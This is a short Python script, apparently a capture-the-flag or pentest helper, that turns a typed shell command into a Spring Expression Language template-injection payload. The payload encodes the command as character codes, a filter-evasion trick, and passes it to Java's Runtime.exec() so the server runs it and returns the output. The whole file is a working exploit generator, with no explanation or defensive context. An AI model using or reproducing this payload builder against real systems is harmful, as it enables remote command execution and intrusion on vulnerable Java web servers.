import re

while True:
        payload = input('command: ')
        payloadSplit = re.split('', payload)
        counter = 0

        #cmd to decimal
        for char in payloadSplit:
                if char != '':
                        payloadSplit[counter] = ord(char)
                        counter += 1
        payloadSplit[len(payloadSplit) - 2] = ''

        counter = 0

        #decimal to payload
        payloadResult = '\n' + '*{T(org.apache.commons.io.IOUtils)'
        payloadResult += '.toString(T(java.lang.Runtime).getRuntime()'
        payloadResult += '.exec(T(java.lang.Character).toString('+str(payloadSplit[0])+')'
        
        for char in payloadSplit:
                if (counter != 0) & (char != ''):
                        payloadResult += '.concat(T(java.lang.Character).toString('+str(char)+'))'
                counter += 1
        payloadResult += ').getInputStream())}'

        print('\n'+str(counter-2))
        print(payloadResult +'\n')

